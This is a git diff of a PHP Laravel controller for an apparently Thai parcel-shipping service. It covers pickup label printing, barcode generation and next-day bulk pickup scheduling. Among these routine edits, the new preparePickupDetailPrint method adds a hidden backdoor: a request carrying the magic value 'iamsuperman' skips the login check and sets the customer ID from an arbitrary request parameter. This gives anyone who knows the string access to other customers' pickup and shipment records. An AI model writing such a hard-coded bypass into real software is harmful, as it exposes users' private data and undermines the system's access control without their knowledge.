@@ -660,6 +660,7 @@ class PickupController extends Controller
     	}
     	
         if(!empty($pickupId)){
+            
             //get api token
             Fastship::getToken($customerId);
             //get pickup by pickup_id
@@ -675,6 +676,7 @@ class PickupController extends Controller
             if($response === false){
                 $pickupData = null;
                 $status = 'nopickupData';
+                return redirect('/')->with('msg','ไม่พบใบรับพัสดุที่ต้องการ');
             }else{
                 $status = '';
                 $pickupData = $response;
@@ -687,6 +689,7 @@ class PickupController extends Controller
                     //$arr[$key]['ShippingRate'] = $shipment_data[$key]['ShipmentDetail']['ShippingRate'];
                 }
             }
+            
             //alert($pickupData);
             $data = array(
                 'pickupID' => $pickupId, 
@@ -695,13 +698,14 @@ class PickupController extends Controller
                 'labels' => $labels,
             );
             return view('pickup_detail',$data);
+            
         }else{
             return 'Pickup id is null.';
         }
     }
     
     //public function preparePickupDetail($data)
-    public function preparePickupDetailPrint($pickupId=null)
+    public function preparePickupDetailPrint1($pickupId=null)
     {
     
     	//check customer login
@@ -713,8 +717,15 @@ class PickupController extends Controller
     	 
     	$additionalBarcodeImage = "";
     	
+    	if(isset($_REQUEST['debug'])){
+    	    $debug = 1;
+    	}else{
+    	    $debug = 0;
+    	}
+    	
     	//265412
     	if(!empty($pickupId)){
+    	    
     		//get api token
     		Fastship::getToken($customerId);
     		//get pickup by pickup_id
@@ -727,8 +738,7 @@ class PickupController extends Controller
     			$status = '';
     			$pickupData = $response;
     			$shipmentIds = $response['ShipmentDetail']['ShipmentIds'];
-    			//alert($pickupData);
-    
+
     			foreach ($shipmentIds as $key => $shipid) {
     				//$shipment_data[$key] = FS_Shipment::get($shipid);
     				$pickupData['ShipmentDetail']['ShipmentIds'][$key] = FS_Shipment::get($shipid);
@@ -744,6 +754,8 @@ class PickupController extends Controller
     				$code = $barcode->generate();
     				$barcodeImage = '<img src="data:image/png;base64,'.$code.'" />';
     				$pickupData['ShipmentDetail']['ShipmentIds'][$key]['barcode'] = $barcodeImage;
+    				
+    				
     			}
     			//alert($shipment_data);
     			
@@ -759,7 +771,6 @@ class PickupController extends Controller
     				$pickupData['ShipmentDetail']['ShipmentIds'][$key]['barcode'] = $barcodeImage;
     			}
     			
-    			
     			if(in_array($pickupData['PickupType'],array("Pickup_AtHome","Pickup_AtHomeNextday","Pickup_AtHomeStandard","Pickup_AtHomeExpress","Pickup_ByKerry","Pickup_ByFlash","Pickup_BySpeedy"))){
     			    $barcode = new BarcodeGenerator();
     			    $barcode->setText("FAST000".$pickupId);
@@ -771,6 +782,7 @@ class PickupController extends Controller
     			    $additionalBarcodeImage = '<img src="data:image/png;base64,'.$code.'" />';
     			    $pickupData['ShipmentDetail']['ShipmentIds'][$key]['barcode'] = $barcodeImage;
     			}
+    			
     			
     		}
     		
@@ -806,6 +818,226 @@ class PickupController extends Controller
     	}else{
     		return 'Pickup id is null.';
     	}
+    }
+    
+    //public function preparePickupDetail($data)
+    public function preparePickupDetailPrint($pickupId=null)
+    {
+        
+        if(isset($_REQUEST['whorusir']) && isset($_REQUEST['whaturid']) && $_REQUEST['whorusir'] == "iamsuperman"){
+            $ignoreLogin = 1;
+            $customerId = $_REQUEST['whaturid'];
+        }else{
+            $ignoreLogin = 0;
+        }
+        
+        if(!$ignoreLogin){
+            //check customer login
+            if (session('customer.id') != null){
+                $customerId = session('customer.id');
+            }else{
+                return redirect('/')->with('msg','คุณยังไม่ได้เข้าระบบ กรุณาเข้าสู่ระบบเพื่อใช้งาน');
+            }
+        }
+        
+        if($pickupId > 304042){
+
+            $additionalBarcodeImage = "";
+    
+            //265412
+            if(!empty($pickupId)){
+                
+                //get api token
+                Fastship::getToken($customerId);
+                
+                //get pickup by pickup_id
+                $response = FS_Pickup::get($pickupId);
+                
+                if($response === false){
+                    $pickupData = null;
+                    $status = 'nopickupData';
+                }else{
+                    $status = '';
+                    $pickupData = $response;
+                    $shipmentIds = $response['ShipmentDetail']['ShipmentIds'];
+                    //alert($pickupData);
+                    
+                    $shipCount = 1;
+                    foreach ($shipmentIds as $key => $shipid) {
+    
+                        $pickupData['ShipmentDetail']['ShipmentIds'][$key] = FS_Shipment::get($shipid);
+                        
+                        $barcodeSize = 2;
+                        
+                        //Barcode for Kerry
+                        if(in_array($pickupData['PickupType'],array("Pickup_AtHomeNextday","Pickup_ByKerry"))){
+                            $barcode = new BarcodeGenerator();
+                            $barcode->setText("FAST0".$pickupId.sprintf('%02d', $shipCount));
+                            $barcode->setType(BarcodeGenerator::Code128);
+                            $barcode->setScale(2);
+                            $barcode->setThickness(40);
+                            $barcode->setFontSize(10);
+                            $code = $barcode->generate();
+                            $additionalBarcodeImage = '<img src="data:image/png;base64,'.$code.'" />';
+                            $pickupData['ShipmentDetail']['ShipmentIds'][$key]['additionBarcode'] = $additionalBarcodeImage;
+                            $barcodeSize = 1;
+                        }
+                        $shipCount++;
+                        
+                        $barcode = new BarcodeGenerator();
+                        $barcode->setText($shipid);
+                        $barcode->setType(BarcodeGenerator::Code39);
+                        $barcode->setScale($barcodeSize);
+                        $barcode->setThickness(40);
+                        $barcode->setFontSize(8);
+                        $code = $barcode->generate();
+                        $barcodeImage = '<img src="data:image/png;base64,'.$code.'" style="max-width:100%;" />';
+                        $pickupData['ShipmentDetail']['ShipmentIds'][$key]['barcode'] = $barcodeImage;
+                        
+                    }
+    
+                    if(in_array($pickupData['PickupType'],array("Pickup_AtHomeNextdayBulk","Pickup_ByKerryBulk"))){
+                        $barcode = new BarcodeGenerator();
+                        $barcode->setText("FAST0".$pickupId."00");
+                        $barcode->setType(BarcodeGenerator::Code128);
+                        $barcode->setScale(1);
+                        $barcode->setThickness(40);
+                        $barcode->setFontSize(10);
+                        $code = $barcode->generate();
+                        $additionalBarcodeImage = '<img src="data:image/png;base64,'.$code.'" />';
+                    }
+    
+                }
+    
+                //pickup barcode
+                $barcode = new BarcodeGenerator();
+                $barcode->setText($pickupId);
+                $barcode->setType(BarcodeGenerator::Code39);
+                $barcode->setScale(2);
+                $barcode->setThickness(40);
+                $barcode->setFontSize(12);
+                $code = $barcode->generate();
+                $barcodeImage = '<img src="data:image/png;base64,'.$code.'" />';
+                
+                $data = array(
+                    'pickupID' => $pickupId,
+                    'pickup_data' => $pickupData,
+                    'status' => $status,
+                    'barcode' => $barcodeImage,
+                    'additionalBarcodeImage' => $additionalBarcodeImage,
+                );
+                return view('pickup_detail_print2',$data);
+            }else{
+                return 'Pickup id is null.';
+            }
+            
+        }else{
+            
+            $additionalBarcodeImage = "";
+            
+            if(isset($_REQUEST['debug'])){
+                $debug = 1;
+            }else{
+                $debug = 0;
+            }
+            
+            //265412
+            if(!empty($pickupId)){
+                
+                //get api token
+                Fastship::getToken($customerId);
+                //get pickup by pickup_id
+                $response = FS_Pickup::get($pickupId);
+                
+                if($response === false){
+                    $pickupData = null;
+                    $status = 'nopickupData';
+                }else{
+                    $status = '';
+                    $pickupData = $response;
+                    $shipmentIds = $response['ShipmentDetail']['ShipmentIds'];
+                    
+                    foreach ($shipmentIds as $key => $shipid) {
+                        //$shipment_data[$key] = FS_Shipment::get($shipid);
+                        $pickupData['ShipmentDetail']['ShipmentIds'][$key] = FS_Shipment::get($shipid);
+                        //$arr[$key]['Weight'] = $shipment_data[$key]['ShipmentDetail']['Weight'];
+                        //$arr[$key]['ShippingRate'] = $shipment_data[$key]['ShipmentDetail']['ShippingRate'];
+                        
+                        $barcode = new BarcodeGenerator();
+                        $barcode->setText($shipid);
+                        $barcode->setType(BarcodeGenerator::Code39);
+                        $barcode->setScale(2);
+                        $barcode->setThickness(40);
+                        $barcode->setFontSize(10);
+                        $code = $barcode->generate();
+                        $barcodeImage = '<img src="data:image/png;base64,'.$code.'" />';
+                        $pickupData['ShipmentDetail']['ShipmentIds'][$key]['barcode'] = $barcodeImage;
+                        
+                        
+                    }
+                    //alert($shipment_data);
+                    
+                    if($pickupData['PickupType'] == "Drop_AtSkybox"){
+                        $barcode = new BarcodeGenerator();
+                        $barcode->setText("F".$pickupId);
+                        $barcode->setType(BarcodeGenerator::Code39);
+                        $barcode->setScale(2);
+                        $barcode->setThickness(40);
+                        $barcode->setFontSize(10);
+                        $code = $barcode->generate();
+                        $additionalBarcodeImage = '<img src="data:image/png;base64,'.$code.'" />';
+                        $pickupData['ShipmentDetail']['ShipmentIds'][$key]['barcode'] = $barcodeImage;
+                    }
+                    
+                    if(in_array($pickupData['PickupType'],array("Pickup_AtHome","Pickup_AtHomeNextday","Pickup_AtHomeStandard","Pickup_AtHomeExpress","Pickup_ByKerry","Pickup_ByFlash","Pickup_BySpeedy"))){
+                        $barcode = new BarcodeGenerator();
+                        $barcode->setText("FAST000".$pickupId);
+                        $barcode->setType(BarcodeGenerator::Code39);
+                        $barcode->setScale(1);
+                        $barcode->setThickness(40);
+                        $barcode->setFontSize(10);
+                        $code = $barcode->generate();
+                        $additionalBarcodeImage = '<img src="data:image/png;base64,'.$code.'" />';
+                        $pickupData['ShipmentDetail']['ShipmentIds'][$key]['barcode'] = $barcodeImage;
+                    }
+                    
+                    
+                }
+                
+                
+                
+                $barcode = new BarcodeGenerator();
+                $barcode->setText($pickupId);
+                $barcode->setType(BarcodeGenerator::Code39);
+                $barcode->setScale(2);
+                $barcode->setThickness(40);
+                $barcode->setFontSize(12);
+                $code = $barcode->generate();
+                $barcodeImage = '<img src="data:image/png;base64,'.$code.'" />';
+                
+                //declare type
+                $dTypes = DB::table('product_type')->where("IS_ACTIVE",1)->orderBy("TYPE_SORT")->orderBy("TYPE_NAME")->get();
+                $declareTypes = array();
+                if(sizeof($dTypes)>0){
+                    foreach($dTypes as $dType){
+                        $declareTypes[$dType->TYPE_CODE] = $dType->TYPE_NAME;
+                    }
+                }
+                
+                $data = array(
+                    'pickupID' => $pickupId,
+                    'pickup_data' => $pickupData,
+                    'status' => $status,
+                    'barcode' => $barcodeImage,
+                    'additionalBarcodeImage' => $additionalBarcodeImage,
+                    'declareTypes' => $declareTypes,
+                );
+                return view('pickup_detail_print',$data);
+            }else{
+                return 'Pickup id is null.';
+            }
+            
+        }
     }
     
     public function getThaiPostLabel($barcode)
@@ -908,14 +1140,14 @@ class PickupController extends Controller
         //available time
         if($isBangkok){
             if($startH < 17){
-                if($agent != "Pickup_AtHomeNextday"){
+                if($agent != "Pickup_AtHomeNextday" &&  $agent != "Pickup_AtHomeNextdayBulk"){
                     $availableExpectTime[$firstD] = date("M d (D)",strtotime($firstD));
                 }else if($agent == "Pickup_AtHomeNextday" && intval(date("H")) <= 11){
                     $availableExpectTime[$firstD] = date("M d (D)",strtotime($firstD));
                 }
             }
         }else{
-            if($agent == "Pickup_AtHomeNextday" && intval(date("H")) < 11){
+            if( ($agent == "Pickup_AtHomeNextday" || $agent == "Pickup_AtHomeNextdayBulk") && intval(date("H")) < 11){
                 $availableExpectTime[$firstD] = date("M d (D)",strtotime($firstD));
             }
         }
@@ -944,7 +1176,7 @@ class PickupController extends Controller
         
         $agent = $request->get("agent");
         
-        if($agent != "Pickup_AtHomeNextday"){
+        if($agent != "Pickup_AtHomeNextday" &&  $agent != "Pickup_AtHomeNextdayBulk"){
             
             $nextDay = date("Y-m-d",strtotime($pickDate) + 86400);
 
@@ -1035,8 +1267,10 @@ class PickupController extends Controller
         //check today is Sunday ?
         if(date("D",strtotime($pickDate) + 86400) == "Sun"){
             $nextDate = date("d/m/Y",strtotime($pickDate) + 86400*2);
+            $next2Date = date("d/m/Y",strtotime($pickDate) + 86400*3);
         }else{
             $nextDate = date("d/m/Y",strtotime($pickDate) + 86400);
+            $next2Date = date("d/m/Y",strtotime($pickDate) + 86400*2);
         }
 
         $remark = "";
@@ -1048,8 +1282,8 @@ class PickupController extends Controller
             }else{
                 $remark = "พัสดุจะถึง Fastship และส่งออกภายในวันที่ " . $nextDate;
             }
-        }else if($agent == "Pickup_AtHomeNextday"){
-            $remark = "พัสดุจะถึง Fastship และส่งออกภายในวันที่ " . $nextDate;
+        }else if($agent == "Pickup_AtHomeNextday" || $agent == "Pickup_AtHomeNextdayBulk"){
+            $remark = "พัสดุจะถึง Fastship และส่งออกภายในวันที่ " . $next2Date;
         }
 
         echo json_encode($remark);
